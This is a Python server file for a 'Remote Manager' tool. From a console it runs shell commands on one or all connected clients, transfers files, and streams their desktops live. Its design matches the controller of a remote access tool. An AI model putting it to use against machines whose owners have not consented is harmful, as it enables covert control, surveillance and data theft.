import asyncio, ssl, time, uuid, logging
from protocol import encode, decode
from state import ClientState
import config

from file_ops import upload_file, downloads, handle_download_chunk
from screen_stream import show_stream_frame

logging.basicConfig(level=logging.INFO)

clients = {}

USAGE_TEXT = """
Remote Manager Server - Commands:
  help
  list
  exec <id> <cmd>
  exec all <cmd>
  upload <id> <local> <remote>
  download <id> <remote> <local>
  view <id>    # 实时桌面流
  quit
"""

async def handle_client(reader, writer):
    client_id = None
    try:
        hello = await decode(reader)
        client_id = hello["client_id"]
        state = ClientState(client_id, writer, hello["info"])
        clients[client_id] = state
        state.last_seen = time.time()
        logging.info(f"[+] {client_id} connected")

        while True:
            msg = await decode(reader)
            if msg is None:
                break
            state.last_seen = time.time()

            if msg["type"] == "heartbeat":
                continue

            if msg["type"] == "task_result":
                print(f"\n[{client_id}] result:\n{msg.get('stdout','')}\n{msg.get('stderr','')}\ncmd> ", end="", flush=True)
                state.active_tasks -= 1

            if msg["type"] == "file_download_chunk":
                await handle_download_chunk(msg, state)

            if msg["type"] == "screen_stream":
                show_stream_frame(msg, window_name=f"{client_id}")

    except Exception as e:
        logging.error(f"[ERR] {client_id} {e}")
    finally:
        if client_id in clients:
            clients.pop(client_id)
        writer.close()
        await writer.wait_closed()
        logging.info(f"[-] {client_id} disconnected")

async def cleanup_task():
    while True:
        now = time.time()
        for cid, state in list(clients.items()):
            if now - state.last_seen > config.HEARTBEAT_TIMEOUT:
                state.writer.close()
                clients.pop(cid, None)
        await asyncio.sleep(config.CLEANUP_INTERVAL)

async def command_console():
    print(USAGE_TEXT)
    while True:
        cmd = await asyncio.to_thread(input, "cmd> ")
        if not cmd.strip():
            continue

        if cmd == "help":
            print(USAGE_TEXT)
            continue
        if cmd == "list":
            print("Connected clients:", list(clients.keys()))
            continue
        if cmd.startswith("exec all "):
            command = cmd[len("exec all "):].strip()
            for cid, state in clients.items():
                if state.active_tasks >= config.MAX_TASKS_PER_CLIENT:
                    continue
                state.active_tasks += 1
                task_id = str(uuid.uuid4())
                state.writer.write(encode({
                    "type": "task",
                    "action": "exec",
                    "task_id": task_id,
                    "payload": {"cmd": command}
                }))
                await state.writer.drain()
            continue
        if cmd.startswith("exec "):
            parts = cmd.split()
            if len(parts)<3: continue
            _, cid, *command_parts = parts
            if cid not in clients: continue
            state = clients[cid]
            if state.active_tasks >= config.MAX_TASKS_PER_CLIENT: continue
            task_id = str(uuid.uuid4())
            state.active_tasks += 1
            state.writer.write(encode({
                "type": "task",
                "action": "exec",
                "task_id": task_id,
                "payload": {"cmd":" ".join(command_parts)}
            }))
            await state.writer.drain()
            continue
        if cmd.startswith("upload "):
            try:
                _, cid, local, remote = cmd.split()
                await upload_file(clients[cid], local, remote)
            except: print("Upload failed")
            continue
        if cmd.startswith("download "):
            try:
                _, cid, remote, local = cmd.split()
                from file_ops import downloads
                downloads[remote] = open(local,"wb")
                clients[cid].writer.write(encode({
                    "type":"task",
                    "action":"download",
                    "payload":{"path":remote,"offset":0}
                }))
                await clients[cid].writer.drain()
            except: print("Download failed")
            continue
        if cmd.startswith("view "):
            _, cid = cmd.split()
            if cid not in clients: continue
            clients[cid].writer.write(encode({
                "type":"task",
                "action":"start_stream",
                "payload":{"fps":2}
            }))
            await clients[cid].writer.drain()
            continue
        if cmd=="quit":
            for state in clients.values():
                state.writer.close()
            break

async def main():
    ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_ctx.load_cert_chain("cert/server.crt","cert/server.key")
    server = await asyncio.start_server(handle_client, config.HOST, config.PORT, ssl=ssl_ctx)
    asyncio.create_task(cleanup_task())
    asyncio.create_task(command_console())
    async with server:
        await server.serve_forever()

asyncio.run(main())
